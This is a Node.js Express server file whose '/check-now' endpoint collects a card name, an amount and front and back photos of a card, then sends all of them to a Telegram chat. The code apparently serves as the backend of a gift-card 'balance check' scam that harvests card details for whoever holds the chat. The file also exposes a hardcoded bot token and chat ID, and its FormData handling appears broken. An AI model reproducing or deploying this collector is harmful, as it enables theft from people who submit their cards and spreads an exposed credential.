const express = require("express");
const multer = require("multer");
const axios = require("axios");
const path = require("path");
const fs = require("fs");

const app = express();
const port = process.env.PORT || 3000;

// Set up multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, "uploads/"); // Specify the upload directory
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname)); // Append timestamp to the filename
    },
});

const upload = multer({ storage });

// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = "7940770931:AAGa6x46t74GVyvYM0jobi4-GDvMjRVINE0";
const CHAT_ID = "6556448976";

// Endpoint to handle form submissions
app.post(
    "/check-now",
    upload.fields([{ name: "card-front" }, { name: "card-back" }]),
    (req, res) => {
        const { "card-name": cardName, "card-amount": cardAmount } = req.body;
        const frontImage = req.files["card-front"][0];
        const backImage = req.files["card-back"][0];

        // Send message to Telegram
        const message = `Card Name: ${cardName}\nAmount: ${cardAmount}`;

        // Send text message
        axios
            .post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    chat_id: CHAT_ID,
                    text: message,
                },
            )
            .then(() => {
                // Function to send images to Telegram
                const sendImage = (filePath) => {
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("photo", fs.createReadStream(filePath));

                    return axios.post(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                        formData,
                        {
                            headers: formData.getHeaders(),
                        },
                    );
                };

                // Send both images
                Promise.all([
                    sendImage(frontImage.path),
                    sendImage(backImage.path),
                ])
                    .then(() => {
                        res.status(200).send("Form submitted successfully!");
                    })
                    .catch((err) => {
                        console.error(err);
                        res.status(500).send(
                            "Error sending images to Telegram.",
                        );
                    });
            })
            .catch((err) => {
                console.error(err);
                res.status(500).send("Error sending message to Telegram.");
            });
    },
);

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
